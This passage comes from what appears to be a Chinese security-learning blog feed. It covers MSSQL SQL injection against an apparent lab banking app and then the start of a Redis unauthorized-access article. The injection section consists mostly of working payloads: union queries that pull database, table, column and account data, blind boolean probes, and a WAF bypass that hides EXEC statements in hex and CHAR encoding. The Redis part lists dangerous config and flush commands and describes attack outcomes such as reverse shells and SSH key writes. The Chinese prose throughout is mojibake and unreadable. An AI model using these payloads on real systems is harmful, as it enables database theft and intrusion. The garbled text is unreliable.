class="hljs-keyword">from</span> fsb_messages)<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441346.png" alt="image-20240405105044697"></p><p><img src="http://cdn.clown2024.cn/202407151441347.png" alt="image-20240405105134618"></p><h1 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a>è”åˆæ³¨å…¥</h1><p>è”åˆæ³¨å…¥å‰å…ˆä½¿ç”¨order byåˆ¤æ–­åˆ—æ•°ï¼Œä¸Šé¢æœ‰æåˆ°è¿‡ã€‚</p><p>æŸ¥è¯¢çš„æ—¶å€™å¦‚æœå‘ç°æ•°æ®ç±»å‹ä¸å…¼å®¹å¯ä»¥ç”¨NULLæ›¿æ¢ã€‚</p><h2 id="è·å–æ•°æ®åº“å"><a href="#è·å–æ•°æ®åº“å-1" class="headerlink" title="è·å–æ•°æ®åº“å"></a>è·å–æ•°æ®åº“å</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union all select NULL,name COLLATE Chinese_PRC_CI_AS,NULL,NULL,NULL from master..sysdatabases<br>//è¡¨æ˜è¿˜å¯ä»¥è¿™æ ·å­å†™æ³•å­¦åˆ°äº†<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441348.png" alt="image-20240405013223845"></p><blockquote><p>è¿™é‡Œé™¤äº†æ•°æ®ç±»å‹è¦ä¸€æ ·æ¯ä¸ªåˆ—çš„æ’åºè§„åˆ™ä¹Ÿè¦ä¸€æ ·ä¸ç„¶ä¼šæŠ¥é”™ï¼Œä¸Šé¢çš„COLLATEå°±æ˜¯ç”¨æ¥è½¬æ¢æ’åºè§„åˆ™çš„ï¼Œä¸è½¬æ¢å°±ä¼šæŠ¥ä¸‹é¢çš„é”™è¯¯</p><p><img src="http://cdn.clown2024.cn/202407151441349.png" alt="image-20240405013414465"></p></blockquote><h2 id="è·å–æ•°æ®åº“è¡¨å"><a href="#è·å–æ•°æ®åº“è¡¨å" class="headerlink" title="è·å–æ•°æ®åº“è¡¨å"></a>è·å–æ•°æ®åº“è¡¨å</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select NULL,name COLLATE Chinese_PRC_CI_AS,NULL,NULL,NULL from FoundStone_Bank..sysobjects where xtype=&#x27;u&#x27;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441350.png" alt="image-20240405013831956"></p><h2 id="è·å–æŒ‡å®šè¡¨çš„å­—æ®µå"><a href="#è·å–æŒ‡å®šè¡¨çš„å­—æ®µå" class="headerlink" title="è·å–æŒ‡å®šè¡¨çš„å­—æ®µå"></a>è·å–æŒ‡å®šè¡¨çš„å­—æ®µå</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select NULL,name COLLATE Chinese_PRC_CI_AS,NULL,NULL,NULL from FoundStone_Bank..syscolumns where id=(select id from FoundStone_Bank..sysobjects where name=&#x27;fsb_accounts&#x27;)<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441351.png" alt="image-20240405014311541"></p><h2 id="è·å–å­—æ®µå…·ä½“çš„å€¼"><a href="#è·å–å­—æ®µå…·ä½“çš„å€¼" class="headerlink" title="è·å–å­—æ®µå…·ä½“çš„å€¼"></a>è·å–å­—æ®µå…·ä½“çš„å€¼</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 union select account_no,NULL,NULL,NULL,NULL from fsb_accounts<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441352.png" alt="image-20240405014506811"></p><h1 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h1><h2 id="åˆ¤æ–­æ•°æ®åº“ä¸ªæ•°"><a href="#åˆ¤æ–­æ•°æ®åº“ä¸ªæ•°" class="headerlink" title="åˆ¤æ–­æ•°æ®åº“ä¸ªæ•°"></a>åˆ¤æ–­æ•°æ®åº“ä¸ªæ•°</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and (select count(*) from master..sysdatabases) &gt; 7<br>?user_id=1 and (select count(*) from master..sysdatabases) &gt; 6<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441353.png" alt="image-20240405103329682"></p><p><img src="http://cdn.clown2024.cn/202407151441354.png" alt="image-20240405103353807"></p><h2 id="è·å–æ•°æ®åº“ä¿¡æ¯"><a href="#è·å–æ•°æ®åº“ä¿¡æ¯" class="headerlink" title="è·å–æ•°æ®åº“ä¿¡æ¯"></a>è·å–æ•°æ®åº“ä¿¡æ¯</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?user_id=1 and substring(db_name(),1,1)=char(106)<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼mysqlç›²æ³¨ä¸€æ ·ï¼Œéå†å­—ç¬¦çš„å¸ƒå°”ç›²æ³¨</p><p><img src="http://cdn.clown2024.cn/202407151441355.png" alt="image-20240405103706224"></p><p>å…¶ä½™çš„æŸ¥è¯¢å°±ä¸å†™äº†ï¼Œåœ¨ä¸Šé¢çš„è”åˆæ³¨å…¥ä¸­ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦éå†å³å¯</p><h1 id="ç®€å•çš„ç»•è¿‡æ³¨å…¥"><a href="#ç®€å•çš„ç»•è¿‡æ³¨å…¥" class="headerlink" title="ç®€å•çš„ç»•è¿‡æ³¨å…¥"></a>ç®€å•çš„ç»•è¿‡æ³¨å…¥</h1><p>è¿™é‡Œä»‹ç»ä¸€ä¸ª<strong>declare</strong>å‡½æ•°ï¼Œä»–æ˜¯mssqlå£°æ˜å±€éƒ¨å˜é‡çš„å‡½æ•°ï¼Œå¯ä»¥ç”¨å®ƒæ¥ç»•è¿‡wafå¯¹ä¸€äº›å…³é”®è¯çš„æ‹¦æˆªã€‚</p><p><strong>ä¸€èˆ¬è¯­æ³•</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@variable_name</span> [<span class="hljs-keyword">AS</span>] data_type [ <span class="hljs-operator">=</span> initial_value];<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç»™å˜é‡èµ‹åˆå§‹å€¼ï¼Œä¹Ÿå¯ä»¥ä¸èµ‹å€¼ã€‚</p><p><strong>å£°æ˜å¤šä¸ªå˜é‡</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@age</span> <span class="hljs-type">INT</span>, <span class="hljs-variable">@salary</span> <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>, <span class="hljs-number">2</span>), <span class="hljs-variable">@isEmployed</span> BIT; #BITè¡¨ç¤ºå¸ƒå°”ç±»å‹<br></code></pre></td></tr></table></figure><p><strong>ç”¨æ³•ç¤ºä¾‹</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@test</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> subject <span class="hljs-keyword">from</span> fsb_messages);<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> fsb_messages;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441356.png" alt="image-20240405110119279"></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@test</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span><span class="hljs-operator">=</span><span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> fsb_messages;<br><span class="hljs-keyword">select</span> <span class="hljs-variable">@test</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> fsb_messages;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441357.png" alt="image-20240405110616058"></p><p><strong>ç»•è¿‡ç¤ºä¾‹</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?user_id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">declare</span> <span class="hljs-variable">@a</span> nvarchar(<span class="hljs-number">2000</span>) <span class="hljs-keyword">set</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;select convert(int,@@version)&#x27;</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@a</span>)<br>#<span class="hljs-keyword">declare</span>å®šä¹‰å˜é‡ <span class="hljs-keyword">set</span>è®¾ç½®å˜é‡å€¼ <span class="hljs-keyword">exec</span>æ‰§è¡Œå˜é‡<br></code></pre></td></tr></table></figure><p>å˜¶æ€ªäº†ï¼Œåœ¨æµè§ˆç½‘é¡µçš„æ—¶å€™ä¸æŠ¥é”™ï¼Œå•ç‹¬æµ‹è¯•äº†ä¸€ä¸‹æ¯ä¸ªå‘½ä»¤éƒ½æ˜¯æ‰§è¡Œäº†çš„å•Šï¼Œè€Œä¸”åœ¨SSMSä¸­åˆæ˜¯æœ‰æ•ˆçš„ï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151441358.png" alt="image-20240405112351188"></p><p>å˜é‡çš„å€¼æ˜¯æ”¯æŒhexå’Œasciiç çš„,å½“è¿‡æ»¤å¼•å·æ—¶å¯ä»¥æŠŠæˆ‘ä»¬çš„è¯­å¥ç¼–ç ä¸€ä¸‹</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@s</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">2000</span>) <span class="hljs-keyword">set</span> <span class="hljs-variable">@s</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420636f6e7665727428696e742c404076657273696f6e29</span> <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@s</span>)<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@s</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">2000</span>) <span class="hljs-keyword">set</span> <span class="hljs-variable">@s</span><span class="hljs-operator">=</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">108</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">99</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">32</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">99</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">111</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">110</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">118</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">114</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">40</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">105</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">110</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">44</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">64</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">64</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">118</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">114</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">105</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">111</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">110</span>) <span class="hljs-operator">+</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">41</span>) <span class="hljs-keyword">exec</span>(<span class="hljs-variable">@s</span>)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> æ•°æ®åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rediså¸¸è§æ¼æ´å­¦ä¹ </title>
      <link href="/2024/03/30/redis%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/30/redis%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="redisåŸºç¡€çŸ¥è¯†"><a href="#redisåŸºç¡€çŸ¥è¯†" class="headerlink" title="redisåŸºç¡€çŸ¥è¯†"></a>redisåŸºç¡€çŸ¥è¯†</h1><p>redisæ˜¯ä¸€ä¸ªéå¸¸å¿«é€Ÿçš„ã€å¼€æºçš„ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€éå…³ç³»ç±»å‹çš„.Key-Valueæ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„APIã€‚å®ƒæä¾›äº†Javaï¼ŒC&#x2F;C++ï¼ŒC#ï¼ŒPHPï¼ŒJavaScriptï¼ŒPerlObject-Cï¼ŒPythonï¼ŒRubyï¼ŒErlangç­‰å®¢æˆ·ç«¯ï¼Œä½¿ç”¨å¾ˆæ–¹ä¾¿ã€‚</p><p>ä¸MySQLæ•°æ®åº“ä¸åŒçš„æ˜¯ï¼ŒRedisçš„æ•°æ®æ˜¯å­˜åœ¨å†…å­˜ä¸­çš„ã€‚å®ƒçš„è¯»å†™é€Ÿåº¦éå¸¸å¿«ï¼Œæ¯ç§’å¯ä»¥å¤„ç†è¶…è¿‡10ä¸‡æ¬¡è¯»å†™æ“ä½œã€‚å› æ­¤redisè¢«å¹¿æ³›åº”ç”¨äºç¼“å­˜ï¼Œå¦å¤–ï¼ŒRedisä¹Ÿç»å¸¸ç”¨æ¥åšåˆ†å¸ƒå¼é”ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒRedisæ”¯æŒäº‹åŠ¡ã€æŒä¹…åŒ–ã€LUA è„šæœ¬ã€LRU é©±åŠ¨äº‹ä»¶ã€å¤šç§é›†ç¾¤æ–¹æ¡ˆã€‚</p><h2 id="ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤"><a href="#ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤" class="headerlink" title="ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤"></a>ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">set xz &quot;Hacker&quot;          # è®¾ç½®é”®xzçš„å€¼ä¸ºå­—ç¬¦ä¸²Hacker<br>get xz                   # è·å–é”®xzçš„å†…å®¹<br>info                     # è·å–æœåŠ¡å™¨çš„å„ç§ä¿¡æ¯å’Œç»Ÿè®¡æ•°æ®æ¯”å¦‚æœåŠ¡å™¨å½“å‰çš„çŠ¶æ€ã€ç»Ÿè®¡ä¿¡æ¯ã€é…ç½®å‚æ•°ã€å®¢æˆ·ç«¯è¿æ¥æƒ…å†µç­‰ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è·å–ç‰¹å®šä¿¡æ¯ï¼Œæ¯”å¦‚info memoryåªè·å–å†…å­˜ä¿¡æ¯<br>SET score 857            # è®¾ç½®é”®scoreçš„å€¼ä¸º857<br>INCR score               # ä½¿ç”¨INCRå‘½ä»¤å°†scoreçš„å€¼å¢åŠ 1<br>GET score                # è·å–é”®scoreçš„å†…å®¹<br>keys *                   # åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰çš„é”®<br>config set protected-mode no        # å…³é—­å®‰å…¨æ¨¡å¼<br>get anotherkey                      # è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„é”®çš„å€¼<br>config set dir /root/redis          # è®¾ç½®ä¿å­˜ç›®å½•<br>config set dbfilename redis.rdb     # è®¾ç½®ä¿å­˜æ–‡ä»¶å<br>config get dir                      # æŸ¥çœ‹ä¿å­˜ç›®å½•<br>config get dbfilename               # æŸ¥çœ‹ä¿å­˜æ–‡ä»¶å<br>save                                # è¿›è¡Œä¸€æ¬¡å¤‡ä»½æ“ä½œ<br>flushall                            # åˆ é™¤æ‰€æœ‰æ•°æ®<br>del key                             # åˆ é™¤é”®ä¸ºkeyçš„æ•°æ®<br>slaveof ip port                     # è®¾ç½®ä¸»ä»å…³ç³»<br>redis-cli -h ip -p 6379 -a passwd   # å¤–éƒ¨è¿æ¥<br>flushdb                             # æ¸…ç©ºå½“å‰æ•°æ®åº“çš„æ‰€æœ‰ key<br>module load /path/to/your/module.so # ç”¨æ¥åŠ è½½è‡ªå®šä¹‰çš„æ¨¡å—æ–‡ä»¶ï¼Œé€šå¸¸æ˜¯soæ–‡ä»¶ï¼Œ/path/to/your/module.so æ›¿æ¢ä¸ºä½ å®é™…çš„æ¨¡å—æ–‡ä»¶è·¯å¾„<br>module list                         #åˆ—å‡ºå·²ç»åŠ è½½çš„æ¨¡å—<br></code></pre></td></tr></table></figure><blockquote><p>ä¸è¿‡moduleåŠ è½½æ¨¡å—æœ‰äº›redisç‰ˆæœ¬æ˜¯ä¸æ”¯æŒçš„</p></blockquote><h2 id="redisç›¸å…³çš„æ•°æ®åº“é…ç½®"><a href="#redisç›¸å…³çš„æ•°æ®åº“é…ç½®" class="headerlink" title="redisç›¸å…³çš„æ•°æ®åº“é…ç½®"></a>redisç›¸å…³çš„æ•°æ®åº“é…ç½®</h2><p>redisæ•°æ®åº“ç›¸å…³çš„é…ç½®å¯ä»¥åœ¨**&#x2F;etc&#x2F;redis&#x2F;redis.conf**æ–‡ä»¶é‡Œé¢è¿›è¡Œè®¾ç½®</p><p><strong>port</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æ ¼å¼ä¸ºportåé¢æ¥ç«¯å£å·ï¼Œå¦‚port 6379ï¼Œè¡¨ç¤ºRedisæœåŠ¡å™¨å°†åœ¨6379ç«¯å£ä¸Šè¿›è¡Œç›‘å¬æ¥ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705640.png" alt="image-20240330103644314"></p><p><strong>bind</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æ ¼å¼ä¸ºbindåé¢æ¥IPåœ°å€ï¼Œå¯ä»¥åŒæ—¶ç»‘å®šåœ¨å¤šä¸ªIPåœ°å€ä¸Šï¼ŒIPåœ°å€ä¹‹é—´ç”¨ç©ºæ ¼åˆ†ç¦»ï¼Œå¦‚bind 192.168.1.100 10.0.0.1ï¼Œè¡¨å…è®¸192.168.1.100å’Œ10.0.0.1ä¸¤ä¸ªIPè¿æ¥ã€‚å¦‚æœè®¾ç½®ä¸º0.0.0.0åˆ™è¡¨ç¤ºä»»æ„ipéƒ½å¯è¿æ¥ï¼Œå°±æ˜¯ç™½åå•å½¢å¼ã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705641.png" alt="image-20240330103720889"></p><p><strong>save</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æ ¼å¼ä¸ºsave &lt;ç§’æ•°&gt; &lt;å˜åŒ–æ•°&gt;ï¼Œè¡¨ç¤ºåœ¨æŒ‡å®šçš„ç§’æ•°å†…æ•°æ®åº“å­˜åœ¨æŒ‡å®šçš„æ”¹å˜æ•°æ—¶è‡ªåŠ¨è¿›è¡Œå¤‡ä»½ï¼ˆRedisæ˜¯å†…å­˜æ•°æ®åº“ï¼Œè¿™é‡Œçš„å¤‡ä»½å°±æ˜¯æŒ‡æŠŠå†…å­˜ä¸­çš„æ•°æ®å¤‡ä»½åˆ°ç£ç›˜ä¸Šï¼‰ã€‚å¯ä»¥åŒæ—¶æŒ‡å®šå¤šä¸ªsaveå‚æ•°ï¼Œå¦‚ï¼š<br>save 900 1<br>save 300 10<br>save 60 10000<br>è¡¨ç¤ºå¦‚æœæ•°æ®åº“çš„å†…å®¹åœ¨60ç§’åäº§ç”Ÿäº†10000æ¬¡æ”¹å˜ï¼Œæˆ–è€…300ç§’åäº§ç”Ÿäº†10æ¬¡æ”¹å˜ï¼Œæˆ–è€…900ç§’åäº§ç”Ÿäº†1æ¬¡æ”¹å˜ï¼Œé‚£ä¹ˆç«‹å³è¿›è¡Œå¤‡ä»½æ“ä½œã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705642.png" alt="image-20240330103908193"></p><p><strong>requirepass</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æ ¼å¼ä¸ºrequirepassåæ¥æŒ‡å®šçš„å¯†ç ï¼Œç”¨äºæŒ‡å®šå®¢æˆ·ç«¯åœ¨è¿æ¥RedisæœåŠ¡å™¨æ—¶æ‰€ä½¿ç”¨çš„å¯†ç ã€‚Redisé»˜è®¤çš„å¯†ç å‚æ•°æ˜¯ç©ºçš„ï¼Œè¯´æ˜ä¸éœ€è¦å¯†ç å³å¯è¿æ¥ï¼›åŒæ—¶ï¼Œé…ç½®æ–‡ä»¶æœ‰ä¸€æ¡æ³¨é‡Šäº†çš„requirepass foobaredå‘½ä»¤ï¼Œå¦‚æœå»æ‰æ³¨é‡Šï¼Œè¡¨ç¤ºéœ€è¦ä½¿ç”¨foobaredå¯†ç æ‰èƒ½è¿æ¥Redisæ•°æ®åº“ã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705643.png" alt="image-20240330104550773"></p><blockquote><p>é»˜è®¤ä¸è®¾ç½®å¯†ç è¿™ä¹Ÿæ˜¯æœªæˆæƒè®¿é—®çš„é‡è¦åŸå› </p></blockquote><p><strong>dir</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æ ¼å¼ä¸ºdiråæ¥æŒ‡å®šçš„è·¯å¾„ï¼Œé»˜è®¤ä¸ºdir ./ï¼ŒæŒ‡æ˜Redisçš„å·¥ä½œç›®å½•ä¸ºå½“å‰ç›®å½•ï¼Œå³redis-serveræ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ã€‚æ³¨æ„ï¼ŒRedisäº§ç”Ÿçš„å¤‡ä»½æ–‡ä»¶å°†æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705644.png" alt="image-20240330104712001"></p><p><strong>dbfilename</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æ ¼å¼ä¸ºdbfilenameåæ¥æŒ‡å®šçš„æ–‡ä»¶åç§°ï¼Œç”¨äºæŒ‡å®šRediså¤‡ä»½æ–‡ä»¶çš„åå­—ï¼Œé»˜è®¤ä¸ºdbfilename dump.rdbï¼Œå³å¤‡ä»½æ–‡ä»¶çš„åå­—ä¸ºdump.rdbã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705645.png" alt="image-20240330104849575"></p><p><strong>config</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é€šè¿‡configå‘½ä»¤å¯ä»¥è¯»å–å’Œè®¾ç½®dirå‚æ•°ä»¥åŠdbfilenameå‚æ•°ï¼Œåé¢å¾ˆå¤šæ”»å‡»æ–¹å¼éƒ½ä¼šéœ€è¦ç”¨åˆ°è¯¥å‘½ä»¤ï¼Œæ‰€ä»¥Redisåœ¨é…ç½®æ–‡ä»¶ä¸­æä¾›äº†rename-commandå‚æ•°æ¥å¯¹å…¶è¿›è¡Œé‡å‘½åæ“ä½œï¼Œå¦‚rename-command CONFIG HTCMDï¼Œå¯ä»¥å°†CONFIGå‘½ä»¤é‡å‘½åä¸ºHTCMDã€‚é…ç½®æ–‡ä»¶é»˜è®¤æ˜¯æ²¡æœ‰å¯¹CONFIGå‘½ä»¤è¿›è¡Œé‡å‘½åæ“ä½œçš„ã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705646.png" alt="image-20240330105533934"></p><p><strong>protected-mode</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">redis3.2ä¹‹åæ·»åŠ äº†protected-modeå®‰å…¨æ¨¡å¼ï¼Œé»˜è®¤å€¼ä¸ºyesï¼Œå¼€å¯åç¦æ­¢å¤–éƒ¨è¿æ¥ï¼Œæ‰€ä»¥åœ¨æµ‹è¯•æ—¶ï¼Œå…ˆåœ¨é…ç½®ä¸­ä¿®æ”¹ä¸ºnoã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705647.png" alt="image-20240330105721000"></p><h1 id="redisæœªæˆæƒè®¿é—®æ¼æ´"><a href="#redisæœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="redisæœªæˆæƒè®¿é—®æ¼æ´"></a>redisæœªæˆæƒè®¿é—®æ¼æ´</h1><p>redisæœªæˆæƒè®¿é—®æ¼æ´æ˜¯ä¸€ä¸ªç”±äºredisæœåŠ¡ç‰ˆæœ¬è¾ƒä½å…¶æœªè®¾ç½®ç™»å½•å¯†ç å¯¼è‡´çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ç›´æ¥åˆ©ç”¨redisæœåŠ¡å™¨çš„ipåœ°å€å’Œç«¯å£å®ŒæˆredisæœåŠ¡å™¨çš„è¿œç¨‹ç™»å½•ï¼Œå¯¹ç›®æ ‡æœåŠ¡å™¨å®Œæˆåç»­çš„æ§åˆ¶å’Œåˆ©ç”¨ã€‚</p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><ol><li>redisç‰ˆæœ¬ä¸º4.x&#x2F;5.0.5ä»¥å‰çš„ç‰ˆæœ¬</li><li>redisç»‘å®šåœ¨0.0.0.0:6379ç«¯å£ï¼Œä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥åšæš´éœ²åœ¨å…¬ç½‘ã€‚</li><li>æ²¡æœ‰è®¾ç½®è®¤è¯å¯†ç (ä¸€èˆ¬ä¸ºç©º)ï¼Œå¯ä»¥å…å¯†ç è¿œç¨‹ç™»é™†redisæœåŠ¡ã€‚</li></ol><h2 id="æ¼æ´å¯¼è‡´çš„å±å®³"><a href="#æ¼æ´å¯¼è‡´çš„å±å®³" class="headerlink" title="æ¼æ´å¯¼è‡´çš„å±å®³"></a>æ¼æ´å¯¼è‡´çš„å±å®³</h2><ol><li>æ”»å‡»è€…å¯ä»¥é€šè¿‡redisçš„å‘½ä»¤æ¥å‘ç›®æ ‡æœåŠ¡å™¨å†™å…¥è®¡åˆ’ä»»åŠ¡è¿›è¡Œåå¼¹shell</li><li>æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘½ä»¤å‘ç½‘ç«™ç›®å½•å†™å…¥webshellæ¥è¿›è¡Œæ§åˆ¶ç½‘ç«™æœåŠ¡å™¨</li><li>æœ€ä¸¥é‡çš„æƒ…å†µï¼Œå¦‚æœç›®æ ‡æœºå™¨æ˜¯ä»¥rootèº«ä»½ç™»å½•çš„æœåŠ¡å™¨å¹¶ä¸”å¼€å¯äº†redisï¼Œé»‘å®¢å°±å¯ä»¥ç›´æ¥åˆ©ç”¨è¯¥è´¦å·çš„æƒé™å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³è€…çš„æœåŠ¡å™¨ã€‚</li></ol><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" 